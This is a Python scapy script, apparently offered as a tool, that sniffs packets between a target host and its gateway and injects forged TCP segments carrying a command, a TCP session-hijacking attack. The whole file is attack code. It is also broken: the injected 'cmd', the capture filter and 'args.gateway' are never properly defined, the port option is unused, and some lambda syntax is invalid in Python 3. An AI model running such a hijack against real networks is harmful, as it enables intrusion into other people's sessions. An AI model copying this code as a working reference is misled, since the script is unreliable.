from scapy.all import *
from argparse import ArgumentParser
import socket

def hijack(packet):
  if packet[IP].src == args.target_ip and packet[IP].dst == args.gateway:
    print("TCP Sequence: " + str(packet[TCP].seq) + " | Ack: " + str(packet[TCP].ack))
    print("Hijack Sequence: " + str(packet[TCP].ack) + " | Hijack Ack: " + str(packet[TCP].seq))
    
    ether = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
    
    # Recreate the IP header, reversing the Source and Destination targets
    ip = IP(src=packet[IP].dst, 
            dst=packet[IP].src, 
            ihl=packet[IP].ihl, 
            len=packet[IP].len, 
            flags=packet[IP].flags, 
            frag=packet[IP].frag, 
            ttl=packet[IP].ttl,
            proto=packet[IP].proto,
            id = 69420)
    
    # Recreate the TCP header, reversing the Source and Destination targets
    tcp = TCP(sport=packet[TCP].dport,
              dport=packet[TCP].sport,
              seq=packet[TCP].ack, 
              ack=packet[TCP].seq, 
              dataofs=packet[TCP].dataofs, 
              reserved=packet[TCP].reserved, 
              flags="PA", 
              window=packet[TCP].window, 
              options=packet[TCP].options)
    
    receive = sendp(ether/ip/tcp/(cmd+"\n"))


# Specify Command Line Arguments
parser = ArgumentParser()
parser.add_argument('--target-ip', '-t', help='Target IP address')
parser.add_argument('--gateway-ip', '-g', help='Gateway IP address')
parser.add_argument('--port', '-p', help='Port')
parser.epilog = "Usage: python tcp_hijack.py -t <IP Address> -g <Gateway IP> -p <port>"        
args = parser.parse_args()

    
try:
  socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
  
  # Checks if argument is not empty  
  if args.target_ip is not None and args.gateway_ip is not None and args.port is not None: 
    
    # Initiate the sniff
    sniff(count=0, prn = lambda packet:hijack(packet), 
          filter=filter, 
          lfilter=lambda(f):f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether))

   
except:
  print('[-]Please specify the appropriate options.')
  print('[!]Example: -t 10.20.30.40 -g 10.20.30.1 -p 22')
  print('[?] -h for help')
  exit()

exit()
